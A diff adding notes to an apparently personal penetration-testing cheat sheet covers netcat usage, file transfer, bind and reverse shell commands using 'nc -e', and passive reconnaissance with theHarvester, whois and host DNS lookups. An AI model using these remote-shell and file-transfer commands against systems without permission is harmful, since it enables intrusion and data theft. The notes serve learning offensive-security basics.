@@ -130,3 +130,77 @@ the & is to send each command to background and run the next on in the loop
 ```
 rdisktop -u *username* -p *password* *hostname/ip*
 ```
+
+# NetCat
+
+on server side:
+
+```
+nc -nlp *port*
+```
+n stands for numerical host ( no DNS)
+l stands for listen
+p stands for port
+
+on clinet side:
+
+```
+nc -n *netcat Server machine IP address* *port*
+```
+
+the port is the server spacified port number 
+
+
+NetCat file transfare:
+
+```
+server side:
+nc -npl *port* > *name for the recived file*
+
+client side:
+nc -n *serverIP* *serverport* < *path of the file to be send*
+```
+NetCat Remote Execution:
+
+```
+**forword command execution(Bind Shell)**
+server side:
+nc -lp *port* -e *full path of command to be executed*
+clinet side:
+nc -n *serverIP* *serverport*
+**revirce shell**
+server side:
+nc -lp *port*
+clinet side:
+nc -n *serverIP* *serverPort* -e *full path of command to be executed*
+```
+# Reconnaissance:
+
+Pasive:
+
+```
+theHarvester -d *domainname* -b google
+
+```
+you can use any other search engen to search in
+
+```
+whois *domainname* OR *IP*
+```
+
+
+DNS Enumeration:
+
+``` 
+host *internet hostname*
+```
+
+that would resolve the hostname to an IP address
+
+```
+host -t *DNS recired type* *domain*
+
+recored type such as: ns, mx, a, and aaaa
+```
+
+Note -A insted of -t gets all the recoreds ns, mx, a, and aaaa recoreds
